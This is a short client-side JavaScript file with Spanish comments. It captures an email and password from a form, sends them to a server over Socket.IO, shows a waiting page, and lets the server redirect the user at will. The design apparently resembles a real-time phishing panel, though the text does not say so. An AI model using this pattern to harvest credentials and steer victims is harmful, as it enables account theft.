// Conectar con el servidor usando Socket.IO
const socket = io();

// Referencia al formulario
const formulario = document.getElementById('formulario');

// Manejar el envío del formulario
formulario.addEventListener('submit', function (e) {
  e.preventDefault();

  const correo = document.getElementById('correo').value;
  const contrasena = document.getElementById('contrasena').value;

  // Enviar los datos al servidor vía Socket.IO
  socket.emit('dataForm', { correo, contrasena });

  // Ir a la pantalla de espera
  window.location.href = 'opciones.html';
});

// Escuchar redirección desde el servidor
socket.on('redirect', ({ url }) => {
  window.location.href = url;
});
